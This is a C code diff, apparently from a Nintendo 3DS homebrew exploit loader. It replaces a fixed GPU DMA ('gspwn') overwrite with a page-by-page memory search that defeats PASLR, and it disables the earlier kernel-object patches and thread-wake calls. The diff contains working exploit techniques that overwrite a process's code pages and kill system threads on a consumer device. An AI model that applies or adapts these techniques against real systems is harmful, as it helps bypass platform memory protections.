@@ -98,6 +98,13 @@ void *memset(void *s, int c, size_t n)
 	for(i=0; i<n; i++)((char*)s)[i]=c;
 }
 
+int memcmp(const void *s1, const void *s2, size_t n)
+{
+	int i;
+	for(i=0; i<n; i++) if(((char*)s1)[i] != ((char*)s2)[i]) return -1;
+	return 0;
+}
+
 Result _FSUSER_OpenFileDirectly(Handle* handle, Handle* out, FS_archive archive, FS_path fileLowPath, u32 openflags, u32 attributes) //no need to have archive opened
 {
 	u32* cmdbuf=getThreadCommandBuffer();
@@ -155,10 +162,10 @@ Result _FSFILE_Read(Handle handle, u32 *bytesRead, u64 offset, u32 *buffer, u32 
 	return cmdbuf[1];
 }
 
-u32 computeCodeAddress(u32 offset)
-{
-	return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+FIRM_APPMEMALLOC+offset;
-}
+// u32 computeCodeAddress(u32 offset)
+// {
+// 	return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+FIRM_APPMEMALLOC+offset;
+// }
 
 int _main()
 {
@@ -187,19 +194,19 @@ int _main()
 			//patch gsp event handler addr to kill gsp thread ASAP
 			*((u32*)(0x356208+0x10+4*0x4))=0x002ABEDC; //svc 0x9 addr
 
-			//patch waitSyncN
-			patchMem(gspHandle, computeCodeAddress(0x00192200), 0x200, 0x19, 0x4F);
-			patchMem(gspHandle, computeCodeAddress(0x00192600), 0x200, 0x7, 0x13);
-			patchMem(gspHandle, computeCodeAddress(0x001CA200), 0x200, 0xB, 0x1E);
-			// patchMem(gspHandle, computeCodeAddress(0x000C6100), 0x200, 0x3C, 0x52);
+			// //patch waitSyncN
+			// patchMem(gspHandle, computeCodeAddress(0x00192200), 0x200, 0x19, 0x4F);
+			// patchMem(gspHandle, computeCodeAddress(0x00192600), 0x200, 0x7, 0x13);
+			// patchMem(gspHandle, computeCodeAddress(0x001CA200), 0x200, 0xB, 0x1E);
+			// // patchMem(gspHandle, computeCodeAddress(0x000C6100), 0x200, 0x3C, 0x52);
 
-			//patch arbitrateAddress
-			patchMem(gspHandle, computeCodeAddress(0x001C9E00), 0x200, 0x14, 0x40);
+			// //patch arbitrateAddress
+			// patchMem(gspHandle, computeCodeAddress(0x001C9E00), 0x200, 0x14, 0x40);
 
-			//wake threads
-			svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
-			svc_signalEvent(((Handle*)0x3480d0)[2]);
-			s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);
+			// //wake threads
+			// svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
+			// svc_signalEvent(((Handle*)0x3480d0)[2]);
+			// s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);
 
 			//kill thread5 without panicking the kernel...
 			*(u8*)0x359935=0x00;
@@ -217,20 +224,20 @@ int _main()
 			//patch gsp event handler addr to kill gsp thread ASAP
 			*((u32*)(0x362DA8+0x10+4*0x4))=0x002B5D14; //svc 0x9 addr
 
-			//patch waitSyncN
-			patchMem(gspHandle, computeCodeAddress(0x0019BD00), 0x200, 0xB, 0x41);
-			patchMem(gspHandle, computeCodeAddress(0x0019C000), 0x200, 0x39, 0x45);
-			patchMem(gspHandle, computeCodeAddress(0x001D3700), 0x200, 0x7, 0x1A);
-			// patchMem(gspHandle, computeCodeAddress(0x000C9100), 0x200, 0x2E, 0x44);
-			// patchMem(gspHandle, computeCodeAddress(0x000EFE00), 0x200, 0x2C, 0x31);
+			// //patch waitSyncN
+			// patchMem(gspHandle, computeCodeAddress(0x0019BD00), 0x200, 0xB, 0x41);
+			// patchMem(gspHandle, computeCodeAddress(0x0019C000), 0x200, 0x39, 0x45);
+			// patchMem(gspHandle, computeCodeAddress(0x001D3700), 0x200, 0x7, 0x1A);
+			// // patchMem(gspHandle, computeCodeAddress(0x000C9100), 0x200, 0x2E, 0x44);
+			// // patchMem(gspHandle, computeCodeAddress(0x000EFE00), 0x200, 0x2C, 0x31);
 
-			//patch arbitrateAddress
-			patchMem(gspHandle, computeCodeAddress(0x001D3300), 0x200, 0x10, 0x3C);
+			// //patch arbitrateAddress
+			// patchMem(gspHandle, computeCodeAddress(0x001D3300), 0x200, 0x10, 0x3C);
 
-			//wake threads
-			svc_arbitrateAddress(*addressArbiterHandle, 0x364ccc, 0, -1, 0);
-			svc_signalEvent(((Handle*)0x354ba8)[2]);
-			s32 out; svc_releaseSemaphore(&out, *(Handle*)0x341AB0, 1); //CHECK !
+			// //wake threads
+			// svc_arbitrateAddress(*addressArbiterHandle, 0x364ccc, 0, -1, 0);
+			// svc_signalEvent(((Handle*)0x354ba8)[2]);
+			// s32 out; svc_releaseSemaphore(&out, *(Handle*)0x341AB0, 1); //CHECK !
 
 			//kill thread5 without panicking the kernel...
 			*(u8*)(0x3664D8+0xd)=0x00;
@@ -263,7 +270,23 @@ int _main()
 
 	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x300000);
 
-	doGspwn((u32*)(0x14100000), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000C000);
+	// doGspwn((u32*)(0x14100000), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000C000);
+	// in order to bypass paslr we have to search for individual pages to overwrite...
+	int i, j;
+	int k = 0;
+	for(i = 0; i < CN_CODEBIN_SIZE && k < 0xC; i += 0x1000)
+	{
+		for(j = 0; j < 0x0000C000; j += 0x1000)
+		{
+			if(!memcmp((void*)(CN_RANDCODEBIN_COPY_BASE + i), (void*)(CN_3DSX_LOADADR + j), 0x20))
+			{
+				doGspwn((u32*)(0x14100000 + j), (u32*)(CN_RANDCODEBIN_BASE + i), 0x00001000);
+				svc_sleepThread(10 * 1000 * 1000);
+				k++;
+				break;
+			} 
+		}
+	}
 
 	svc_sleepThread(0x3B9ACA00);
 
